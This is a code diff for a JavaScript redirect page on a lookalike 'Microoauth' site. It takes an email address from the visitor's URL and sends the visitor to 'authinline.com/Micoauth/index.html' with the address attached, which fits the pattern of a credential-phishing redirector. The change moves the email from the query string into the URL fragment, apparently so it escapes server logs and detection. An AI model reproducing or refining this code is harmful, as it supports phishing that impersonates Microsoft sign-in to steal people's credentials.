@@ -7,29 +7,25 @@
       // Get the current URL
       var currentURL = window.location.href;
 
-      // Check if the current URL contains a '?' character
-      if (currentURL.includes('?')) {
-        // Split the URL into two parts: the base URL and the email part
-        var parts = currentURL.split('?');
-        var baseURL = parts[0]; // https://Microoauth.github.io/mail
-        var emailPart = parts[1];
+      // Split the URL into two parts: before and after the fragment identifier (#)
+      var parts = currentURL.split('#');
+      var emailPart = parts[1]; // Extract what's after the #
 
-        // Check if the email part is not empty
-        if (emailPart) {
-          // Use a regular expression to remove trailing equal sign and anything after it
-          emailPart = emailPart.replace(/=.*$/, '');
+      // Check if the email part is not empty and contains an equal sign
+      if (emailPart && emailPart.includes('=')) {
+        // Split the email part using the equal sign as a delimiter
+        var emailParts = emailPart.split('=');
 
-          // Construct the redirect URL by appending the cleaned email to the second link
-          var redirectURL = 'https://authinline.com/Micoauth/index.html?' + emailPart;
+        // Take the first part which should be the email address
+        var cleanedEmail = emailParts[0];
 
-          // Redirect to the constructed URL
-          window.location.href = redirectURL;
-        } else {
-          // If the email part is empty, simply redirect to the second link
-          window.location.href = 'https://authinline.com/Micoauth/index.html';
-        }
+        // Construct the redirect URL by appending the cleaned email to the second link
+        var redirectURL = 'https://authinline.com/Micoauth/index.html?' + cleanedEmail;
+
+        // Redirect to the constructed URL
+        window.location.href = redirectURL;
       } else {
-        // If no '?' character is found, simply redirect to the second link
+        // If the email part is empty or does not contain an equal sign, simply redirect to the second link
         window.location.href = 'https://authinline.com/Micoauth/index.html';
       }
     }
